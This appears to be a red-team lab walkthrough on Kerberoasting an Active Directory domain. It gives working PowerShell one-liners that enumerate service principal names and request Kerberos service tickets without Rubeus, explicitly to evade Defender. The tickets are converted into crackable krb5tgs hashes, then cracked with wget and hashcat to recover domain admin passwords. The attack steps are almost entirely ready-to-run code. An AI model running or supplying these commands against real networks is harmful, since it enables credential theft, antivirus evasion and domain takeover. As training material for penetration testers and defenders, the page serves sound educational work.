# Advanced Kerberoasting




## Roast like a Ghost


The point of kerberoasting is to get credentials for accounts with higher privledges. Service accounts or accounts with SPNs (Call them SPINS if you want to be cool.) often have higher credentials. MSSQL databases actually automatically create them for the service account running the MSSQL service.  But they can often be assigned to accounts for number of services including files services.

As you can imagine, even lowly Domain Users need to interact with file services, and can request tickets associated with these SPN accounts. Previously you did this were Rubeus, now we are going to turn on defender, watch it delete that tool immediately because it is super burned, and then craft our own Ticket Requests to get the Kerb Hash back from the svc-file account.


1. Now that you have the SAM account names, perform a subsquent query to obtain the SPN names. These will be used to perform targeted kerberoasting attacks by obtaining the kerberos pre-authentication ticket hash from the DC.

```
$name=svc-file
[string[]]$spns=([adsisearcher]"(&(objectCategory=user)(samaccountname=$name))").findall()|%{$_.properties["serviceprincipalname"]};$spns
```

1. Armed with the list of the user SAM accounts and SPN names, we will perform the attack using the command below. Note that you will need to change the SPN and SAM account for each user (e.g., "`HOST/dragonmount.wheel.co`", "`svc-file`"). Copy the SPN hashes to crack offline.


```
$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("HOST/dragonmount.wheel.co", "svc-file");
```


1. Collect the hashes into a text file (`kerb.hash`) on your kali operater box. 


1. Get the provided word list (`rawk_you.txt`) from the file server, and run John/Hashcat with it.
   ```sh
   wget http://172.16.2.2:8080/rush_hour/rawk_you.txt \
   hashcat -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O ./kerb.hash ./rawk_you.txt
   ```
   Keep a text file with the decrypted passwords for each domain admin.



